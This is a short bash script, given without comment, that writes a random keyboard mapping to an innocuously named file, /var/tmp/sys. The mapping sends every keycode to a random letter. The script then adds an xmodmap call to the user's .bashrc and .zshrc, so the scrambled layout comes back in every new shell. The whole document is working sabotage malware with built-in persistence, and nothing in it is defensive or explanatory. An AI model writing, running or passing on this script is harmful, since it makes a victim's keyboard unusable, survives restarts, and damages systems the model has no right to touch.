#!/bin/bash

mapping_file="/var/tmp/sys"

keycodes=($(seq 8 255))
characters=($(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 1 | head -n ${#keycodes[@]}))

mapping_content=""
for ((i=0; i<${#keycodes[@]}; i++)); do
    keycode=${keycodes[i]}
    char=${characters[i]}
    mapping_content+="keycode $keycode = $char\n"
done

echo -e $mapping_content > $mapping_file

ls -a ~/ | grep 'zshrc' &> /dev/null
if [ $? = 0 ]; then
        echo "xmodmap /var/tmp/sys" >> ~/.zshrc
fi
ls -a ~/ | grep 'bashrc' &> /dev/null
if [ $? = 0 ]; then
        echo "xmodmap /var/tmp/sys" >> ~/.bashrc
fi
